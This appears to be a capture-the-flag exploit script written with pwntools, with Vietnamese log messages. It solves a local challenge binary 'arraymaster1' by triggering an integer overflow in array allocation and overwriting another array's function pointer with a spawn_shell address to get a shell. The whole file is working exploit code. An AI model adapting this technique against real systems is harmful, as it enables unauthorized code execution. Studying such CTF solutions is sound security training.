from pwn import *

context.binary = "./arraymaster1"
elf = context.binary

SPAWN_SHELL = elf.symbols['spawn_shell']

p = remote('localhost', 22228) 


def init(identifier, type_of_array, length):
    p.sendlineafter(b'> ', f"init {identifier} {type_of_array} {length}".encode())

def set(identifier, index, value):
    p.sendlineafter(b'> ', f"set {identifier} {index} {value}".encode())

log.info("Bước 1: Tạo mảng 'A' với lỗi integer overflow")
init('A', 64, 2**61+1)

log.info("Bước 2: Tạo mảng 'B' để làm mục tiêu ghi đè")
init('B', 64, 10)

OFFSET_TO_GET_PTR = 7 

log.info(f"Bước 3: Ghi đè con trỏ 'get' của B tại offset {OFFSET_TO_GET_PTR} bằng địa chỉ hàm spawn_shell: {hex(SPAWN_SHELL)}")
set('A', OFFSET_TO_GET_PTR, SPAWN_SHELL)

log.info("Bước 4: Gọi 'get B 0' để kích hoạt spawn_shell")
p.sendline(b"get B 0")

p.interactive()